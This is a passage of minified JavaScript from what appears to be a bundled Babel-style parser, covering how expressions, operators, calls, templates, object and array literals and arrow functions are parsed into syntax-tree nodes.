$=this.parseYield(J);if(Q)$=Q.call(this,$,J);return $}}let W;if(X)W=!1;else X=new E4,W=!0;let{type:G}=this.state;if(G===10||w0(G))this.state.potentialArrowAt=this.state.start;let H=this.parseMaybeConditional(X);if(Q)H=Q.call(this,H,J);if(Hv(this.state.type)){let $=this.startNodeAt(J),z=this.state.value;if($.operator=z,this.match(29)){this.toAssignable(H,!0),$.left=H;let U=J.index;if(X.doubleProtoLoc!=null&&X.doubleProtoLoc.index>=U)X.doubleProtoLoc=null;if(X.shorthandAssignLoc!=null&&X.shorthandAssignLoc.index>=U)X.shorthandAssignLoc=null;if(X.privateKeyLoc!=null&&X.privateKeyLoc.index>=U)this.checkDestructuringPrivate(X),X.privateKeyLoc=null;if(X.voidPatternLoc!=null&&X.voidPatternLoc.index>=U)X.voidPatternLoc=null}else $.left=H;return this.next(),$.right=this.parseMaybeAssign(),this.checkLVal(H,this.finishNode($,"AssignmentExpression")),$}else if(W)this.checkExpressionErrors(X,!0);if(Y){let{type:$}=this.state;if((this.hasPlugin("v8intrinsic")?C4($):C4($)&&!this.match(54))&&!this.isAmbiguousPrefixOrIdentifier())return this.raiseOverwrite(x.YieldNotInGeneratorFunction,J),this.parseYield(J)}return H}parseMaybeConditional(X){let Q=this.state.startLoc,J=this.state.potentialArrowAt,Y=this.parseExprOps(X);if(this.shouldExitDescending(Y,J))return Y;return this.parseConditional(Y,Q,X)}parseConditional(X,Q,J){if(this.eat(17)){let Y=this.startNodeAt(Q);return Y.test=X,Y.consequent=this.parseMaybeAssignAllowIn(),this.expect(14),Y.alternate=this.parseMaybeAssign(),this.finishNode(Y,"ConditionalExpression")}return X}parseMaybeUnaryOrPrivate(X){return this.match(139)?this.parsePrivateName():this.parseMaybeUnary(X)}parseExprOps(X){let Q=this.state.startLoc,J=this.state.potentialArrowAt,Y=this.parseMaybeUnaryOrPrivate(X);if(this.shouldExitDescending(Y,J))return Y;return this.parseExprOp(Y,Q,-1)}parseExprOp(X,Q,J){if(this.isPrivateName(X)){let W=this.getPrivateNameSV(X);if(J>=rJ(58)||!this.prodParam.hasIn||!this.match(58))this.raise(x.PrivateInExpectedIn,X,{identifierName:W});this.classScope.usePrivateName(W,X.loc.start)}let Y=this.state.type;if(zv(Y)&&(this.prodParam.hasIn||!this.match(58))){let W=rJ(Y);if(W>J){if(Y===39){if(this.expectPlugin("pipelineOperator"),this.state.inFSharpPipelineDirectBody)return X;this.checkPipelineAtInfixOperator(X,Q)}let G=this.startNodeAt(Q);G.left=X,G.operator=this.state.value;let H=Y===41||Y===42,$=Y===40;if($)W=rJ(42);if(this.next(),Y===39&&this.hasPlugin(["pipelineOperator",{proposal:"minimal"}])){if(this.state.type===96&&this.prodParam.hasAwait)throw this.raise(x.UnexpectedAwaitAfterPipelineBody,this.state.startLoc)}G.right=this.parseExprOpRightExpr(Y,W);let z=this.finishNode(G,H||$?"LogicalExpression":"BinaryExpression"),U=this.state.type;if($&&(U===41||U===42)||H&&U===40)throw this.raise(x.MixingCoalesceWithLogical,this.state.startLoc);return this.parseExprOp(z,Q,J)}}return X}parseExprOpRightExpr(X,Q){let J=this.state.startLoc;switch(X){case 39:switch(this.getPluginOption("pipelineOperator","proposal")){case"hack":return this.withTopicBindingContext(()=>{return this.parseHackPipeBody()});case"fsharp":return this.withSoloAwaitPermittingContext(()=>{return this.parseFSharpPipelineBody(Q)})}if(this.getPluginOption("pipelineOperator","proposal")==="smart")return this.withTopicBindingContext(()=>{if(this.prodParam.hasYield&&this.isContextual(108))throw this.raise(x.PipeBodyIsTighter,this.state.startLoc);return this.parseSmartPipelineBodyInStyle(this.parseExprOpBaseRightExpr(X,Q),J)});default:return this.parseExprOpBaseRightExpr(X,Q)}}parseExprOpBaseRightExpr(X,Q){let J=this.state.startLoc;return this.parseExprOp(this.parseMaybeUnaryOrPrivate(),J,qv(X)?Q-1:Q)}parseHackPipeBody(){var X;let{startLoc:Q}=this.state,J=this.parseMaybeAssign();if(nb.has(J.type)&&!((X=J.extra)!=null&&X.parenthesized))this.raise(x.PipeUnparenthesizedBody,Q,{type:J.type});if(!this.topicReferenceWasUsedInCurrentContext())this.raise(x.PipeTopicUnused,Q);return J}checkExponentialAfterUnary(X){if(this.match(57))this.raise(x.UnexpectedTokenUnaryExponentiation,X.argument)}parseMaybeUnary(X,Q){let J=this.state.startLoc,Y=this.isContextual(96);if(Y&&this.recordAwaitIfAllowed()){this.next();let $=this.parseAwait(J);if(!Q)this.checkExponentialAfterUnary($);return $}let W=this.match(34),G=this.startNode();if(Kv(this.state.type)){if(G.operator=this.state.value,G.prefix=!0,this.match(72))this.expectPlugin("throwExpressions");let $=this.match(89);if(this.next(),G.argument=this.parseMaybeUnary(null,!0),this.checkExpressionErrors(X,!0),this.state.strict&&$){let z=G.argument;if(z.type==="Identifier")this.raise(x.StrictDelete,G);else if(this.hasPropertyAsPrivateName(z))this.raise(x.DeletePrivateField,G)}if(!W){if(!Q)this.checkExponentialAfterUnary(G);return this.finishNode(G,"UnaryExpression")}}let H=this.parseUpdate(G,W,X);if(Y){let{type:$}=this.state;if((this.hasPlugin("v8intrinsic")?C4($):C4($)&&!this.match(54))&&!this.isAmbiguousPrefixOrIdentifier())return this.raiseOverwrite(x.AwaitNotInAsyncContext,J),this.parseAwait(J)}return H}parseUpdate(X,Q,J){if(Q){let G=X;return this.checkLVal(G.argument,this.finishNode(G,"UpdateExpression")),X}let Y=this.state.startLoc,W=this.parseExprSubscripts(J);if(this.checkExpressionErrors(J,!1))return W;while(Uv(this.state.type)&&!this.canInsertSemicolon()){let G=this.startNodeAt(Y);G.operator=this.state.value,G.prefix=!1,G.argument=W,this.next(),this.checkLVal(W,W=this.finishNode(G,"UpdateExpression"))}return W}parseExprSubscripts(X){let Q=this.state.startLoc,J=this.state.potentialArrowAt,Y=this.parseExprAtom(X);if(this.shouldExitDescending(Y,J))return Y;return this.parseSubscripts(Y,Q)}parseSubscripts(X,Q,J){let Y={optionalChainMember:!1,maybeAsyncArrow:this.atPossibleAsyncArrow(X),stop:!1};do X=this.parseSubscript(X,Q,J,Y),Y.maybeAsyncArrow=!1;while(!Y.stop);return X}parseSubscript(X,Q,J,Y){let{type:W}=this.state;if(!J&&W===15)return this.parseBind(X,Q,J,Y);else if(aJ(W))return this.parseTaggedTemplateExpression(X,Q,Y);let G=!1;if(W===18){if(J){if(this.raise(x.OptionalChainingNoNew,this.state.startLoc),this.lookaheadCharCode()===40)return this.stopParseSubscript(X,Y)}Y.optionalChainMember=G=!0,this.next()}if(!J&&this.match(10))return this.parseCoverCallAndAsyncArrowHead(X,Q,Y,G);else{let H=this.eat(0);if(H||G||this.eat(16))return this.parseMember(X,Q,Y,H,G);else return this.stopParseSubscript(X,Y)}}stopParseSubscript(X,Q){return Q.stop=!0,X}parseMember(X,Q,J,Y,W){let G=this.startNodeAt(Q);if(G.object=X,G.computed=Y,Y)G.property=this.parseExpression(),this.expect(3);else if(this.match(139)){if(X.type==="Super")this.raise(x.SuperPrivateField,Q);this.classScope.usePrivateName(this.state.value,this.state.startLoc),G.property=this.parsePrivateName()}else G.property=this.parseIdentifier(!0);if(J.optionalChainMember)return G.optional=W,this.finishNode(G,"OptionalMemberExpression");else return this.finishNode(G,"MemberExpression")}parseBind(X,Q,J,Y){let W=this.startNodeAt(Q);return W.object=X,this.next(),W.callee=this.parseNoCallExpr(),Y.stop=!0,this.parseSubscripts(this.finishNode(W,"BindExpression"),Q,J)}parseCoverCallAndAsyncArrowHead(X,Q,J,Y){let W=this.state.maybeInArrowParameters,G=null;this.state.maybeInArrowParameters=!0,this.next();let H=this.startNodeAt(Q);H.callee=X;let{maybeAsyncArrow:$,optionalChainMember:z}=J;if($)this.expressionScope.enter(uv()),G=new E4;if(z)H.optional=Y;if(Y)H.arguments=this.parseCallExpressionArguments();else H.arguments=this.parseCallExpressionArguments(X.type!=="Super",H,G);let U=this.finishCallExpression(H,z);if($&&this.shouldParseAsyncArrow()&&!Y)J.stop=!0,this.checkDestructuringPrivate(G),this.expressionScope.validateAsPattern(),this.expressionScope.exit(),U=this.parseAsyncArrowFromCallExpression(this.startNodeAt(Q),U);else{if($)this.checkExpressionErrors(G,!0),this.expressionScope.exit();this.toReferencedArguments(U)}return this.state.maybeInArrowParameters=W,U}toReferencedArguments(X,Q){this.toReferencedListDeep(X.arguments,Q)}parseTaggedTemplateExpression(X,Q,J){let Y=this.startNodeAt(Q);if(Y.tag=X,Y.quasi=this.parseTemplate(!0),J.optionalChainMember)this.raise(x.OptionalChainingNoTemplate,Q);return this.finishNode(Y,"TaggedTemplateExpression")}atPossibleAsyncArrow(X){return X.type==="Identifier"&&X.name==="async"&&this.state.lastTokEndLoc.index===X.end&&!this.canInsertSemicolon()&&X.end-X.start===5&&this.offsetToSourcePos(X.start)===this.state.potentialArrowAt}finishCallExpression(X,Q){if(X.callee.type==="Import"){if(X.arguments.length===0||X.arguments.length>2)this.raise(x.ImportCallArity,X);else for(let J of X.arguments)if(J.type==="SpreadElement")this.raise(x.ImportCallSpreadArgument,J)}return this.finishNode(X,Q?"OptionalCallExpression":"CallExpression")}parseCallExpressionArguments(X,Q,J){let Y=[],W=!0,G=this.state.inFSharpPipelineDirectBody;this.state.inFSharpPipelineDirectBody=!1;while(!this.eat(11)){if(W)W=!1;else if(this.expect(12),this.match(11)){if(Q)this.addTrailingCommaExtraToNode(Q);this.next();break}Y.push(this.parseExprListItem(11,!1,J,X))}return this.state.inFSharpPipelineDirectBody=G,Y}shouldParseAsyncArrow(){return this.match(19)&&!this.canInsertSemicolon()}parseAsyncArrowFromCallExpression(X,Q){var J;if(this.resetPreviousNodeTrailingComments(Q),this.expect(19),this.parseArrowExpression(X,Q.arguments,!0,(J=Q.extra)==null?void 0:J.trailingCommaLoc),Q.innerComments)_4(X,Q.innerComments);if(Q.callee.trailingComments)_4(X,Q.callee.trailingComments);return X}parseNoCallExpr(){let X=this.state.startLoc;return this.parseSubscripts(this.parseExprAtom(),X,!0)}parseExprAtom(X){let Q,J=null,{type:Y}=this.state;switch(Y){case 79:return this.parseSuper();case 83:if(Q=this.startNode(),this.next(),this.match(16))return this.parseImportMetaPropertyOrPhaseCall(Q);if(this.match(10))if(this.optionFlags&512)return this.parseImportCall(Q);else return this.finishNode(Q,"Import");else return this.raise(x.UnsupportedImport,this.state.lastTokStartLoc),this.finishNode(Q,"Import");case 78:return Q=this.startNode(),this.next(),this.finishNode(Q,"ThisExpression");case 90:return this.parseDo(this.startNode(),!1);case 56:case 31:return this.readRegexp(),this.parseRegExpLiteral(this.state.value);case 135:return this.parseNumericLiteral(this.state.value);case 136:return this.parseBigIntLiteral(this.state.value);case 134:return this.parseStringLiteral(this.state.value);case 84:return this.parseNullLiteral();case 85:return this.parseBooleanLiteral(!0);case 86:return this.parseBooleanLiteral(!1);case 10:{let W=this.state.potentialArrowAt===this.state.start;return this.parseParenAndDistinguishExpression(W)}case 0:return this.parseArrayLike(3,!0,!1,X);case 5:return this.parseObjectLike(8,!1,!1,X);case 68:return this.parseFunctionOrFunctionSent();case 26:J=this.parseDecorators();case 80:return this.parseClass(this.maybeTakeDecorators(J,this.startNode()),!1);case 77:return this.parseNewOrNewTarget();case 25:case 24:return this.parseTemplate(!1);case 15:{Q=this.startNode(),this.next(),Q.object=null;let W=Q.callee=this.parseNoCallExpr();if(W.type==="MemberExpression")return this.finishNode(Q,"BindExpression");else throw this.raise(x.UnsupportedBind,W)}case 139:return this.raise(x.PrivateInExpectedIn,this.state.startLoc,{identifierName:this.state.value}),this.parsePrivateName();case 33:return this.parseTopicReferenceThenEqualsSign(54,"%");case 32:return this.parseTopicReferenceThenEqualsSign(44,"^");case 37:case 38:return this.parseTopicReference("hack");case 44:case 54:case 27:{let W=this.getPluginOption("pipelineOperator","proposal");if(W)return this.parseTopicReference(W);this.unexpected();break}case 47:{let W=this.input.codePointAt(this.nextTokenStart());if(I8(W)||W===62)this.expectOnePlugin(["jsx","flow","typescript"]);else this.unexpected();break}default:if(Y===137)return this.parseDecimalLiteral(this.state.value);else if(Y===2||Y===1)return this.parseArrayLike(this.state.type===2?4:3,!1,!0);else if(Y===6||Y===7)return this.parseObjectLike(this.state.type===6?9:8,!1,!0);if(w0(Y)){if(this.isContextual(127)&&this.lookaheadInLineCharCode()===123)return this.parseModuleExpression();let W=this.state.potentialArrowAt===this.state.start,G=this.state.containsEsc,H=this.parseIdentifier();if(!G&&H.name==="async"&&!this.canInsertSemicolon()){let{type:$}=this.state;if($===68)return this.resetPreviousNodeTrailingComments(H),this.next(),this.parseAsyncFunctionExpression(this.startNodeAtNode(H));else if(w0($))if(this.lookaheadCharCode()===61)return this.parseAsyncArrowUnaryFunction(this.startNodeAtNode(H));else return H;else if($===90)return this.resetPreviousNodeTrailingComments(H),this.parseDo(this.startNodeAtNode(H),!0)}if(W&&this.match(19)&&!this.canInsertSemicolon())return this.next(),this.parseArrowExpression(this.startNodeAtNode(H),[H],!1);return H}else this.unexpected()}}parseTopicReferenceThenEqualsSign(X,Q){let J=this.getPluginOption("pipelineOperator","proposal");if(J)return this.state.type=X,this.state.value=Q,this.state.pos--,this.state.end--,this.state.endLoc=C9(this.state.endLoc,-1),this.parseTopicReference(J);else this.unexpected()}parseTopicReference(X){let Q=this.startNode(),J=this.state.startLoc,Y=this.state.type;return this.next(),this.finishTopicReference(Q,J,X,Y)}finishTopicReference(X,Q,J,Y){if(this.testTopicReferenceConfiguration(J,Q,Y))if(J==="hack"){if(!this.topicReferenceIsAllowedInCurrentContext())this.raise(x.PipeTopicUnbound,Q);return this.registerTopicReference(),this.finishNode(X,"TopicReference")}else{if(!this.topicReferenceIsAllowedInCurrentContext())this.raise(x.PrimaryTopicNotAllowed,Q);return this.registerTopicReference(),this.finishNode(X,"PipelinePrimaryTopicReference")}else throw this.raise(x.PipeTopicUnconfiguredToken,Q,{token:VX(Y)})}testTopicReferenceConfiguration(X,Q,J){switch(X){case"hack":return this.hasPlugin(["pipelineOperator",{topicToken:VX(J)}]);case"smart":return J===27;default:throw this.raise(x.PipeTopicRequiresHackPipes,Q)}}parseAsyncArrowUnaryFunction(X){this.prodParam.enter(nJ(!0,this.prodParam.hasYield));let Q=[this.parseIdentifier()];if(this.prodParam.exit(),this.hasPrecedingLineBreak())this.raise(x.LineTerminatorBeforeArrow,this.state.curPosition());return this.expect(19),this.parseArrowExpression(X,Q,!0)}parseDo(X,Q){if(this.expectPlugin("doExpressions"),Q)this.expectPlugin("asyncDoExpressions");X.async=Q,this.next();let J=this.state.labels;if(this.state.labels=[],Q)this.prodParam.enter(2),X.body=this.parseBlock(),this.prodParam.exit();else X.body=this.parseBlock();return this.state.labels=J,this.finishNode(X,"DoExpression")}parseSuper(){let X=this.startNode();if(this.next(),this.match(10)&&!this.scope.allowDirectSuper&&!(this.optionFlags&16))this.raise(x.SuperNotAllowed,X);else if(!this.scope.allowSuper&&!(this.optionFlags&16))this.raise(x.UnexpectedSuper,X);if(!this.match(10)&&!this.match(0)&&!this.match(16))this.raise(x.UnsupportedSuper,X);return this.finishNode(X,"Super")}parsePrivateName(){let X=this.startNode(),Q=this.startNodeAt(C9(this.state.startLoc,1)),J=this.state.value;return this.next(),X.id=this.createIdentifier(Q,J),this.finishNode(X,"PrivateName")}parseFunctionOrFunctionSent(){let X=this.startNode();if(this.next(),this.prodParam.hasYield&&this.match(16)){let Q=this.createIdentifier(this.startNodeAtNode(X),"function");if(this.next(),this.match(103))this.expectPlugin("functionSent");else if(!this.hasPlugin("functionSent"))this.unexpected();return this.parseMetaProperty(X,Q,"sent")}return this.parseFunction(X)}parseMetaProperty(X,Q,J){X.meta=Q;let Y=this.state.containsEsc;if(X.property=this.parseIdentifier(!0),X.property.name!==J||Y)this.raise(x.UnsupportedMetaProperty,X.property,{target:Q.name,onlyValidPropertyName:J});return this.finishNode(X,"MetaProperty")}parseImportMetaPropertyOrPhaseCall(X){if(this.next(),this.isContextual(105)||this.isContextual(97)){let Q=this.isContextual(105);return this.expectPlugin(Q?"sourcePhaseImports":"deferredImportEvaluation"),this.next(),X.phase=Q?"source":"defer",this.parseImportCall(X)}else{let Q=this.createIdentifierAt(this.startNodeAtNode(X),"import",this.state.lastTokStartLoc);if(this.isContextual(101)){if(!this.inModule)this.raise(x.ImportMetaOutsideModule,Q);this.sawUnambiguousESM=!0}return this.parseMetaProperty(X,Q,"meta")}}parseLiteralAtNode(X,Q,J){return this.addExtra(J,"rawValue",X),this.addExtra(J,"raw",this.input.slice(this.offsetToSourcePos(J.start),this.state.end)),J.value=X,this.next(),this.finishNode(J,Q)}parseLiteral(X,Q){let J=this.startNode();return this.parseLiteralAtNode(X,Q,J)}parseStringLiteral(X){return this.parseLiteral(X,"StringLiteral")}parseNumericLiteral(X){return this.parseLiteral(X,"NumericLiteral")}parseBigIntLiteral(X){return this.parseLiteral(X,"BigIntLiteral")}parseDecimalLiteral(X){return this.parseLiteral(X,"DecimalLiteral")}parseRegExpLiteral(X){let Q=this.startNode();return this.addExtra(Q,"raw",this.input.slice(this.offsetToSourcePos(Q.start),this.state.end)),Q.pattern=X.pattern,Q.flags=X.flags,this.next(),this.finishNode(Q,"RegExpLiteral")}parseBooleanLiteral(X){let Q=this.startNode();return Q.value=X,this.next(),this.finishNode(Q,"BooleanLiteral")}parseNullLiteral(){let X=this.startNode();return this.next(),this.finishNode(X,"NullLiteral")}parseParenAndDistinguishExpression(X){let Q=this.state.startLoc,J;this.next(),this.expressionScope.enter(mv());let Y=this.state.maybeInArrowParameters,W=this.state.inFSharpPipelineDirectBody;this.state.maybeInArrowParameters=!0,this.state.inFSharpPipelineDirectBody=!1;let G=this.state.startLoc,H=[],$=new E4,z=!0,U,K;while(!this.match(11)){if(z)z=!1;else if(this.expect(12,$.optionalParametersLoc===null?null:$.optionalParametersLoc),this.match(11)){K=this.state.startLoc;break}if(this.match(21)){let Z=this.state.startLoc;if(U=this.state.startLoc,H.push(this.parseParenItem(this.parseRestBinding(),Z)),!this.checkCommaAfterRest(41))break}else H.push(this.parseMaybeAssignAllowInOrVoidPattern(11,$,this.parseParenItem))}let B=this.state.lastTokEndLoc;this.expect(11),this.state.maybeInArrowParameters=Y,this.state.inFSharpPipelineDirectBody=W;let q=this.startNodeAt(Q);if(X&&this.shouldParseArrow(H)&&(q=this.parseArrow(q)))return this.checkDestructuringPrivate($),this.expressionScope.validateAsPattern(),this.expressionScope.exit(),this.parseArrowExpression(q,H,!1),q;if(this.expressionScope.exit(),!H.length)this.unexpected(this.state.lastTokStartLoc);if(K)this.unexpected(K);if(U)this.unexpected(U);if(this.checkExpressionErrors($,!0),this.toReferencedListDeep(H,!0),H.length>1)J=this.startNodeAt(G),J.expressions=H,this.finishNode(J,"SequenceExpression"),this.resetEndLocation(J,B);else J=H[0];return this.wrapParenthesis(Q,J)}wrapParenthesis(X,Q){if(!(this.optionFlags&1024))return this.addExtra(Q,"parenthesized",!0),this.addExtra(Q,"parenStart",X.index),this.takeSurroundingComments(Q,X.index,this.state.lastTokEndLoc.index),Q;let J=this.startNodeAt(X);return J.expression=Q,this.finishNode(J,"ParenthesizedExpression")}shouldParseArrow(X){return!this.canInsertSemicolon()}parseArrow(X){if(this.eat(19))return X}parseParenItem(X,Q){return X}parseNewOrNewTarget(){let X=this.startNode();if(this.next(),this.match(16)){let Q=this.createIdentifier(this.startNodeAtNode(X),"new");this.next();let J=this.parseMetaProperty(X,Q,"target");if(!this.scope.allowNewTarget)this.raise(x.UnexpectedNewTarget,J);return J}return this.parseNew(X)}parseNew(X){if(this.parseNewCallee(X),this.eat(10)){let Q=this.parseExprList(11);this.toReferencedList(Q),X.arguments=Q}else X.arguments=[];return this.finishNode(X,"NewExpression")}parseNewCallee(X){let Q=this.match(83),J=this.parseNoCallExpr();if(X.callee=J,Q&&(J.type==="Import"||J.type==="ImportExpression"))this.raise(x.ImportCallNotNewExpression,J)}parseTemplateElement(X){let{start:Q,startLoc:J,end:Y,value:W}=this.state,G=Q+1,H=this.startNodeAt(C9(J,1));if(W===null){if(!X)this.raise(x.InvalidEscapeSequenceTemplate,C9(this.state.firstInvalidTemplateEscapePos,1))}let $=this.match(24),z=$?-1:-2,U=Y+z;H.value={raw:this.input.slice(G,U).replace(/\r\n?/g,`
`),cooked:W===null?null:W.slice(1,z)},H.tail=$,this.next();let K=this.finishNode(H,"TemplateElement");return this.resetEndLocation(K,C9(this.state.lastTokEndLoc,z)),K}parseTemplate(X){let Q=this.startNode(),J=this.parseTemplateElement(X),Y=[J],W=[];while(!J.tail)W.push(this.parseTemplateSubstitution()),this.readTemplateContinuation(),Y.push(J=this.parseTemplateElement(X));return Q.expressions=W,Q.quasis=Y,this.finishNode(Q,"TemplateLiteral")}parseTemplateSubstitution(){return this.parseExpression()}parseObjectLike(X,Q,J,Y){if(J)this.expectPlugin("recordAndTuple");let W=this.state.inFSharpPipelineDirectBody;this.state.inFSharpPipelineDirectBody=!1;let G=!1,H=!0,$=this.startNode();$.properties=[],this.next();while(!this.match(X)){if(H)H=!1;else if(this.expect(12),this.match(X)){this.addTrailingCommaExtraToNode($);break}let U;if(Q)U=this.parseBindingProperty();else U=this.parsePropertyDefinition(Y),G=this.checkProto(U,J,G,Y);if(J&&!this.isObjectProperty(U)&&U.type!=="SpreadElement")this.raise(x.InvalidRecordProperty,U);if(U.shorthand)this.addExtra(U,"shorthand",!0);$.properties.push(U)}this.next(),this.state.inFSharpPipelineDirectBody=W;let z="ObjectExpression";if(Q)z="ObjectPattern";else if(J)z="RecordExpression";return this.finishNode($,z)}addTrailingCommaExtraToNode(X){this.addExtra(X,"trailingComma",this.state.lastTokStartLoc.index),this.addExtra(X,"trailingCommaLoc",this.state.lastTokStartLoc,!1)}maybeAsyncOrAccessorProp(X){return!X.computed&&X.key.type==="Identifier"&&(this.isLiteralPropertyName()||this.match(0)||this.match(55))}parsePropertyDefinition(X){let Q=[];if(this.match(26)){if(this.hasPlugin("decorators"))this.raise(x.UnsupportedPropertyDecorator,this.state.startLoc);while(this.match(26))Q.push(this.parseDecorator())}let J=this.startNode(),Y=!1,W=!1,G;if(this.match(21)){if(Q.length)this.unexpected();return this.parseSpread()}if(Q.length)J.decorators=Q,Q=[];if(J.method=!1,X)G=this.state.startLoc;let H=this.eat(55);this.parsePropertyNamePrefixOperator(J);let $=this.state.containsEsc;if(this.parsePropertyName(J,X),!H&&!$&&this.maybeAsyncOrAccessorProp(J)){let{key:z}=J,U=z.name;if(U==="async"&&!this.hasPrecedingLineBreak())Y=!0,this.resetPreviousNodeTrailingComments(z),H=this.eat(55),this.parsePropertyName(J);if(U==="get"||U==="set"){if(W=!0,this.resetPreviousNodeTrailingComments(z),J.kind=U,this.match(55))H=!0,this.raise(x.AccessorIsGenerator,this.state.curPosition(),{kind:U}),this.next();this.parsePropertyName(J)}}return this.parseObjPropValue(J,G,H,Y,!1,W,X)}getGetterSetterExpectedParamCount(X){return X.kind==="get"?0:1}getObjectOrClassMethodParams(X){return X.params}checkGetterSetterParams(X){var Q;let J=this.getGetterSetterExpectedParamCount(X),Y=this.getObjectOrClassMethodParams(X);if(Y.length!==J)this.raise(X.kind==="get"?x.BadGetterArity:x.BadSetterArity,X);if(X.kind==="set"&&((Q=Y[Y.length-1])==null?void 0:Q.type)==="RestElement")this.raise(x.BadSetterRestParameter,X)}parseObjectMethod(X,Q,J,Y,W){if(W){let G=this.parseMethod(X,Q,!1,!1,!1,"ObjectMethod");return this.checkGetterSetterParams(G),G}if(J||Q||this.match(10)){if(Y)this.unexpected();return X.kind="method",X.method=!0,this.parseMethod(X,Q,J,!1,!1,"ObjectMethod")}}parseObjectProperty(X,Q,J,Y){if(X.shorthand=!1,this.eat(14))return X.value=J?this.parseMaybeDefault(this.state.startLoc):this.parseMaybeAssignAllowInOrVoidPattern(8,Y),this.finishObjectProperty(X);if(!X.computed&&X.key.type==="Identifier"){if(this.checkReservedWord(X.key.name,X.key.loc.start,!0,!1),J)X.value=this.parseMaybeDefault(Q,this.cloneIdentifier(X.key));else if(this.match(29)){let W=this.state.startLoc;if(Y!=null){if(Y.shorthandAssignLoc===null)Y.shorthandAssignLoc=W}else this.raise(x.InvalidCoverInitializedName,W);X.value=this.parseMaybeDefault(Q,this.cloneIdentifier(X.key))}else X.value=this.cloneIdentifier(X.key);return X.shorthand=!0,this.finishObjectProperty(X)}}finishObjectProperty(X){return this.finishNode(X,"ObjectProperty")}parseObjPropValue(X,Q,J,Y,W,G,H){let $=this.parseObjectMethod(X,J,Y,W,G)||this.parseObjectProperty(X,Q,W,H);if(!$)this.unexpected();return $}parsePropertyName(X,Q){if(this.eat(0))X.computed=!0,X.key=this.parseMaybeAssignAllowIn(),this.expect(3);else{let{type:J,value:Y}=this.state,W;if(C6(J))W=this.parseIdentifier(!0);else switch(J){case 135:W=this.parseNumericLiteral(Y);break;case 134:W=this.parseStringLiteral(Y);break;case 136:W=this.parseBigIntLiteral(Y);break;case 139:{let G=this.state.startLoc;if(Q!=null){if(Q.privateKeyLoc===null)Q.privateKeyLoc=G}else this.raise(x.UnexpectedPrivateField,G);W=this.parsePrivateName();break}default:if(J===137){W=this.parseDecimalLiteral(Y);break}this.unexpected()}if(X.key=W,J!==139)X.computed=!1}}initFunction(X,Q){X.id=null,X.generator=!1,X.async=Q}parseMethod(X,Q,J,Y,W,G,H=!1){this.initFunction(X,J),X.generator=Q,this.scope.enter(530|(H?576:0)|(W?32:0)),this.prodParam.enter(nJ(J,X.generator)),this.parseFunctionParams(X,Y);let $=this.parseFunctionBodyAndFinish(X,G,!0);return this.prodParam.exit(),this.scope.exit(),$}parseArrayLike(X,Q,J,Y){if(J)this.expectPlugin("recordAndTuple");let W=this.state.inFSharpPipelineDirectBody;this.state.inFSharpPipelineDirectBody=!1;let G=this.startNode();return this.next(),G.elements=this.parseExprList(X,!J,Y,G),this.state.inFSharpPipelineDirectBody=W,this.finishNode(G,J?"TupleExpression":"ArrayExpression")}parseArrowExpression(X,Q,J,Y){this.scope.enter(518);let W=nJ(J,!1);if(!this.match(5)&&this.prodParam.hasIn)W|=8;this.prodParam.enter(W),this.initFunction(X,J);let G=this.state.maybeInArrowParameters;if(Q)this.state.maybeInArrowParameters=!0,this.setArrowFunctionParameters(X,Q,Y);return this.state.maybeInArrowParameters=!1,this.parseFunctionBody(X,!0),this.prodParam.exit(),this.scope.exit(),this.state.maybeInArrowParameters=G,this.finishNode(X,"ArrowFunctionExpression")}setArrowFunctionParameters(X,Q,J){this.toAssignableList(Q,J,!1),X.params=Q}parseFunctionBodyAndFinish(X,Q,J=!1){return this.parseFunctionBody(X,!1,J),this.finishNode(X,Q)}parseFunctionBody(X,Q,J=!1){let Y=Q&&!this.match(5);if(this.expressionScope.enter(pq()),Y)X.body=this.parseMaybeAssign(),this.checkParams(X,!1,Q,!1);else{let W=this.state.strict,G=this.state.labels;this.state.labels=[],this.prodParam.enter(this.prodParam.currentFlags()|4),X.body=this.parseBlock(!0,!1,(H)=>{let $=!this.isSimpleParamList(X.params);if(H&&$)this.raise(x.IllegalLanguageModeDirective,(X.kind==="method"||X.kind==="constructor")&&!!X.key?X.key.loc.end:X);let z=!W&&this.state.strict;if(this.checkParams(X,!this.state.strict&&!Q&&!J&&!$,Q,z),this.state.strict&&X.id)this.checkIdentifier(X.id,65,z)}),this.prodParam.exit(),this.state.labels=G}this.expressionScope.exit()}isSimpleParameter(X){return X.type==="Identifier"}isSimpleParamList(X){for(let Q=0,J=X.length;Q<J;Q++)if(!this.isSimpleParameter(X[Q]))return!1;return!0}checkParams(X,Q,J,Y=!0){let W=!Q&&new Set,G={type:"FormalParameters"};for(let H of X.params)this.checkLVal(H,G,5,W,Y)}parseExprList(X,Q,J,Y){let W=[],G=!0;while(!this.eat(X)){if(G)G=!1;else if(this.expect(12),this.match(X)){if(Y)this.addTrailingCommaExtraToNode(Y);this.next();break}W.push(this.parseExprListItem(X,Q,J))}return W}parseExprListItem(X,Q,J,Y){let W;if(this.match(12)){if(!Q)this.raise(x.UnexpectedToken,this.state.curPosition(),{unexpected:","});W=null}else if(this.match(21)){let G=this.state.startLoc;W=this.parseParenItem(this.parseSpread(J),G)}else if(this.match(17)){if(this.expectPlugin("partialApplication"),!Y)this.raise(x.UnexpectedArgumentPlaceholder,this.state.startLoc);let G=this.startNode();this.next(),W=this.finishNode(G,"ArgumentPlaceholder")}else W=this.parseMaybeAssignAllowInOrVoidPattern(X,J,this.parseParenItem);return W}parseIdentifier(X){let Q=this.startNode(),J=this.parseIdentifierName(X);return this.createIdentifier(Q,J)}createIdentifier(X,Q){return X.name=Q,X.loc.identifierName=Q,this.finishNode(X,"Identifier")}createIdentifierAt(X,Q,J){return X.name=Q,X.loc.identifierName=Q,this.finishNodeAt(X,"Identifier",J)}parseIdentifierName(X){let Q,{startLoc:J,type:Y}=this.state;if(C6(Y))Q=this.state.value;else this.unexpected();let W=Wv(Y);if(X){if(W)this.replaceToken(132)}else this.checkReservedWord(Q,J,W,!1);return this.next(),Q}checkReservedWord(X,Q,J,Y){if(X.length>10)return;if(!Nv(X))return;if(J&&Rv(X)){this.raise(x.UnexpectedKeyword,Q,{keyword:X});return}if((!this.state.strict?Cq:Y?Eq:Pq)(X,this.inModule)){this.raise(x.UnexpectedReservedWord,Q,{reservedWord:X});return}else if(X==="yield"){if(this.prodParam.hasYield){this.raise(x.YieldBindingIdentifier,Q);return}}else if(X==="await"){if(this.prodParam.hasAwait){this.raise(x.AwaitBindingIdentifier,Q);return}if(this.scope.inStaticBlock){this.raise(x.AwaitBindingIdentifierInStaticBlock,Q);return}this.expressionScope.recordAsyncArrowParametersError(Q)}else 